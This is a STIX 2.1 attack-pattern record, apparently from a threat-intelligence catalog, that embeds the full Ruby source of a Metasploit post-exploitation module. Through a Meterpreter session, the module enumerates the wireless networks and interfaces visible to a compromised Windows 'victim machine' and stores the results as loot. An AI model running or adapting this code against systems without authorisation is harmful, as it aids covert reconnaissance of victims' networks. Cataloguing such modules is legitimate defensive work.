{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9d8087d-b7c6-4019-aee3-71e12fb6bfe8",
    "created": "2024-08-14T16:33:05.00538Z",
    "modified": "2024-08-14T16:33:05.005384Z",
    "name": "Windows Gather Wireless BSS Info",
    "description": " This module gathers information about the wireless Basic Service Sets available to the victim machine.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/wlan/wlan_bss_list.rb",
            "external_id": "wlan_bss_list.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Wireless BSS Info',\n        'Description' => %q{\n          This module gathers information about the wireless Basic Service Sets\n          available to the victim machine.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    # Opens memory access into the host process\n    mypid = client.sys.process.getpid\n    @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)\n    @wlanapi = client.railgun.wlanapi\n\n    wlan_connections = \"Wireless LAN Active Connections: \\n\"\n\n    wlan_handle = open_handle\n    unless wlan_handle\n      print_error(\"Couldn't open WlanAPI Handle. WLAN API may not be installed on target\")\n      print_error('On Windows XP this could also mean the Wireless Zero Configuration Service is turned off')\n      return\n    end\n\n    wlan_iflist = enum_interfaces(wlan_handle)\n\n    networks = []\n\n    wlan_iflist.each do |interface|\n      # Scan with the interface, then wait 10 seconds to give it time to finish\n      # If we don't wait we can get unpredicatble results. May be a race condition\n      scan_results = @wlanapi.WlanScan(wlan_handle, interface['guid'], nil, nil, nil)\n      sleep(10)\n\n      # Grab the list of available Basic Service Sets\n      bss_list = wlan_get_networks(wlan_handle, interface['guid'])\n      networks << bss_list\n    end\n\n    # flatten and uniq the array to try and keep a unique lsit of networks\n    networks.flatten!\n    networks.uniq!\n    network_list = \"Available Wireless Networks\\n\\n\"\n    networks.each do |network|\n      netout = \"SSID: #{network['ssid']} \\n\\tBSSID: #{network['bssid']} \\n\\tType: #{network['type']}\\n\\t\"\n      netout << \"PHY: #{network['physical']} \\n\\tRSSI: #{network['rssi']} \\n\\tSignal: #{network['signal']}\\n\"\n      print_good(netout)\n      network_list << netout\n    end\n\n    # strip out any nullbytes for safe loot storage\n    network_list.gsub!(/\\x00/, '')\n    store_loot('host.windows.wlan.networks', 'text/plain', session, network_list, 'wlan_networks.txt', 'Available Wireless LAN Networks')\n\n    # close the Wlan API Handle\n    closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)\n    if closehandle['return'] == 0\n      print_status('WlanAPI Handle Closed Successfully')\n    else\n      print_error('There was an error closing the Handle')\n    end\n  end\n\n  def open_handle\n    begin\n      wlhandle = @wlanapi.WlanOpenHandle(2, nil, 4, 4)\n    rescue StandardError\n      return nil\n    end\n    return wlhandle['phClientHandle']\n  end\n\n  def wlan_get_networks(wlan_handle, guid)\n    networks = []\n\n    bss_list = @wlanapi.WlanGetNetworkBssList(wlan_handle, guid, nil, 3, true, nil, 4)\n    pointer = bss_list['ppWlanBssList']\n    totalsize = @host_process.memory.read(pointer, 4)\n    totalsize = totalsize.unpack('V')[0]\n\n    pointer = (pointer + 4)\n    numitems = @host_process.memory.read(pointer, 4)\n    numitems = numitems.unpack('V')[0]\n\n    print_status(\"Number of Networks: #{numitems}\")\n\n    # Iterate through each BSS\n    (1..numitems).each do |_i|\n      bss = {}\n\n      # If the length of the SSID is 0 then something is wrong. Skip this one\n      pointer = (pointer + 4)\n      len_ssid = @host_process.memory.read(pointer, 4)\n      unless len_ssid.unpack('V')[0]\n        next\n      end\n\n      # Grabs the ESSID\n      pointer = (pointer + 4)\n      ssid = @host_process.memory.read(pointer, 32)\n      bss['ssid'] = ssid.gsub(/\\x00/, '')\n\n      # Grab the BSSID/MAC Address of the AP\n      pointer = (pointer + 36)\n      bssid = @host_process.memory.read(pointer, 6)\n      bssid = bssid.unpack('H*')[0]\n      bssid.insert(2, ':')\n      bssid.insert(5, ':')\n      bssid.insert(8, ':')\n      bssid.insert(11, ':')\n      bssid.insert(14, ':')\n      bss['bssid'] = bssid\n\n      # Get the BSS Type\n      pointer = (pointer + 8)\n      bsstype = @host_process.memory.read(pointer, 4)\n      bsstype = bsstype.unpack('V')[0]\n      case bsstype\n      when 1\n        bss['type'] = 'Infrastructure'\n      when 2\n        bss['type'] = 'Independent'\n      when 3\n        bss['type'] = 'Any'\n      else\n        bss['type'] = 'Unknown BSS Type'\n      end\n\n      # Get the Physical Association Type\n      pointer = (pointer + 4)\n      phy_type = @host_process.memory.read(pointer, 4)\n      phy_type = phy_type.unpack('V')[0]\n      case phy_type\n      when 1\n        bss['physical'] = 'Frequency-hopping spread-spectrum (FHSS)'\n      when 2\n        bss['physical'] = 'Direct sequence spread spectrum (DSSS)'\n      when 3\n        bss['physical'] = 'Infrared (IR) baseband'\n      when 4\n        bss['physical'] = 'Orthogonal frequency division multiplexing (OFDM)'\n      when 5\n        bss['physical'] = 'High-rate DSSS (HRDSSS)'\n      when 6\n        bss['physical'] = 'Extended rate PHY type'\n      when 7\n        bss['physical'] = '802.11n PHY type'\n      else\n        bss['physical'] = 'Unknown Association Type'\n      end\n\n      # Get the Received Signal Strength Indicator\n      pointer = (pointer + 4)\n      rssi = @host_process.memory.read(pointer, 4)\n      rssi = getle_signed_int(rssi)\n      bss['rssi'] = rssi\n\n      # Get the signal strength\n      pointer = (pointer + 4)\n      signal = @host_process.memory.read(pointer, 4)\n      bss['signal'] = signal.unpack('V')[0]\n\n      # skip all the rest of the data points as they aren't particularly useful\n      pointer = (pointer + 296)\n\n      networks << bss\n    end\n    return networks\n  end\n\n  def enum_interfaces(wlan_handle)\n    iflist = @wlanapi.WlanEnumInterfaces(wlan_handle, nil, 4)\n    pointer = iflist['ppInterfaceList']\n\n    numifs = @host_process.memory.read(pointer, 4)\n    numifs = numifs.unpack('V')[0]\n\n    interfaces = []\n\n    # Set the pointer ahead to the first element in the array\n    pointer = (pointer + 8)\n    (1..numifs).each do |_i|\n      interface = {}\n      # Read the GUID (16 bytes)\n      interface['guid'] = @host_process.memory.read(pointer, 16)\n      pointer = (pointer + 16)\n      # Read the description(up to 512 bytes)\n      interface['description'] = @host_process.memory.read(pointer, 512)\n      pointer = (pointer + 512)\n      # Read the state of the interface (4 bytes)\n      state = @host_process.memory.read(pointer, 4)\n      pointer = (pointer + 4)\n      # Turn the state into human readable form\n      state = state.unpack('V')[0]\n      case state\n      when 0\n        interface['state'] = 'The interface is not ready to operate.'\n      when 1\n        interface['state'] = 'The interface is connected to a network.'\n      when 2\n        interface['state'] = 'The interface is the first node in an ad hoc network. No peer has connected.'\n      when 3\n        interface['state'] = 'The interface is disconnecting from the current network.'\n      when 4\n        interface['state'] = 'The interface is not connected to any network.'\n      when 5\n        interface['state'] = 'The interface is attempting to associate with a network.'\n      when 6\n        interface['state'] = 'Auto configuration is discovering the settings for the network.'\n      when 7\n        interface['state'] = 'The interface is in the process of authenticating.'\n      else\n        interface['state'] = 'Unknown State'\n      end\n      interfaces << interface\n    end\n    return interfaces\n  end\n\n  def getle_signed_int(str)\n    arr = str.unpack('V*')\n    bits = 0\n    num = 0\n    arr.each do |int|\n      num += int << bits\n      bits += 32\n    end\n    num >= 2**(bits - 1) ? num - 2**bits : num\n  end\n\n  # Convert the GUID to human readable form\n  def guid_to_string(guid)\n    aguid = guid.unpack('H*')[0]\n    sguid = '{' + aguid[6, 2] + aguid[4, 2] + aguid[2, 2] + aguid[0, 2]\n    sguid << '-' + aguid[10, 2] + aguid[8, 2] + '-' + aguid[14, 2] + aguid[12, 2] + '-' + aguid[16, 4]\n    sguid << '-' + aguid[20, 12] + '}'\n    return sguid\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}